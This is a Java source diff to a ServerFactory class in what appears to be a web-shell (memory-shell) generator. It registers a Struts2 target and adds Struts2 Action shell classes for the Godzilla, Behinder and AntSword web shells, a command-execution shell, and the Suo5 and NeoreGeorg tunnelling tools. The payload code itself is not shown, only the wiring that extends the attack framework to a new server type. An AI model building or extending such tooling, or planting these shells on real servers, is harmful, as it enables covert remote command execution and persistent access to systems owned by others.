@@ -44,6 +44,7 @@ public class ServerFactory {
         register(Server.SpringWebMvc, SpringWebMvc::new);
         register(Server.SpringWebFlux, SpringWebFlux::new);
         register(Server.XXLJOB, XxlJob::new);
+        register(Server.Struct2, Struct2::new);
 
         addToolMapping(ShellTool.Godzilla, ToolMapping.builder()
                 .addShellClass(SERVLET, GodzillaServlet.class)
@@ -76,6 +77,7 @@ public class ServerFactory {
                 .addShellClass(UNDERTOW_AGENT_SERVLET_HANDLER, GodzillaUndertowServletHandler.class)
                 .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, Godzilla.class)
                 .addShellClass(WAS_AGENT_FILTER_MANAGER, Godzilla.class)
+                .addShellClass(ACTION, GodzillaStruct2Action.class)
                 .build());
 
         addToolMapping(ShellTool.Behinder, ToolMapping.builder()
@@ -100,6 +102,7 @@ public class ServerFactory {
                 .addShellClass(UNDERTOW_AGENT_SERVLET_HANDLER, BehinderUndertowServletHandler.class)
                 .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, Behinder.class)
                 .addShellClass(WAS_AGENT_FILTER_MANAGER, Behinder.class)
+                .addShellClass(ACTION, BehinderStruct2Action.class)
                 .build());
 
         addToolMapping(ShellTool.AntSword, ToolMapping.builder()
@@ -117,6 +120,7 @@ public class ServerFactory {
                 .addShellClass(UNDERTOW_AGENT_SERVLET_HANDLER, AntSwordUndertowServletHandler.class)
                 .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, AntSword.class)
                 .addShellClass(WAS_AGENT_FILTER_MANAGER, AntSword.class)
+                .addShellClass(ACTION, AntSwordStruct2Action.class)
                 .build());
 
         addToolMapping(ShellTool.Command, ToolMapping.builder()
@@ -151,6 +155,7 @@ public class ServerFactory {
                 .addShellClass(UNDERTOW_AGENT_SERVLET_HANDLER, CommandUndertowServletHandler.class)
                 .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, Command.class)
                 .addShellClass(WAS_AGENT_FILTER_MANAGER, Command.class)
+                .addShellClass(ACTION, CommandStruct2Action.class)
                 .build());
 
         addToolMapping(ShellTool.Suo5, ToolMapping.builder()
@@ -176,6 +181,7 @@ public class ServerFactory {
                 .addShellClass(UNDERTOW_AGENT_SERVLET_HANDLER, Suo5UndertowServletHandler.class)
                 .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, Suo5.class)
                 .addShellClass(WAS_AGENT_FILTER_MANAGER, Suo5.class)
+                .addShellClass(ACTION, Suo5Struct2Action.class)
                 .build());
 
         addToolMapping(ShellTool.NeoreGeorg, ToolMapping.builder()
@@ -200,6 +206,7 @@ public class ServerFactory {
                 .addShellClass(UNDERTOW_AGENT_SERVLET_HANDLER, NeoreGeorgUndertowServletHandler.class)
                 .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, NeoreGeorg.class)
                 .addShellClass(WAS_AGENT_FILTER_MANAGER, NeoreGeorg.class)
+                .addShellClass(ACTION, NeoreGeorgStruct2Action.class)
                 .build());
     }
 
